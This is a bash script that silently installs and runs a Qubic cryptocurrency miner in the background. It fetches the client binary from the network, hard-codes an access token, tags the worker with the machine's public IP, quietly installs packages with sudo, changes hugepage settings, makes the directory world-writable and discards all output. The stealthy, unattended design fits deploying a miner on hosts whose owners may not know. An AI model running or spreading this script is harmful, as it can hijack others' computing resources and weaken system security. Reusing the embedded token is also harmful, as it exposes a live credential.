#!/bin/bash

token="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImUwNDUwZTdmLWQ0OGEtNDkwYy1hZTg3LWQyMDhhODM0ZGE2MSIsIk1pbmluZyI6IiIsIm5iZiI6MTczNTMwMDUzNiwiZXhwIjoxNzY2ODM2NTM2LCJpYXQiOjE3MzUzMDA1MzYsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.VmK5EeaZPL8Sr_8_wTQRfALJ_At3bwuMtoxvrpNPX8COnO-G6tsKfcNYQU38g8LxyJN7WUaqY6oXgLv1I_SKcAhBHaXWjcJIKtocj0XqpWzBlGGuNZppMZONjNsCbAo5D2SOpvlyjIC1y9_D6MplR3gXWlH7sInUv3dNEBadHIdm_iZfchCR1LMq_knjppAX0fvefLaSVRqxOia5jP0DmwGg53AofFVUw4ALx9aHd8NadvlXmdhW6SVRtwLP02V59wJXBxbdhJnLo3Mn2cRqxB2pX1phTucf-kcFRQloXmZtCBFDpQPeWqzk96TE4XFEzAZ3bFCauAtM6azLzBW_EA"
version="3.1.1"
hugepage="128"
work=`mktemp -d`

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"

wget --no-check-certificate -qO- "https://dl.qubic.li/downloads/qli-Client-${version}-Linux-x64.tar.gz" |tar -zx -C "${work}"
[ -f "${work}/qli-Client" ] || exit 1

cat >"${work}/appsettings.json"<< EOF
{
  "ClientSettings": {
    "pps": false,
    "accessToken": "${token}",
    "alias": "${addr}",
    "trainer": {
      "cpu": true,
      "gpu": false
    },
    "autoUpdate": false
  }
}
EOF


sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget icu-devtools >/dev/null 2>&1 || apt -qqy install wget icu-devtools >/dev/null 2>&1
sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1


chmod -R 777 "${work}"
cd "${work}"
nohup ./qli-Client >/dev/null 2>&1 &
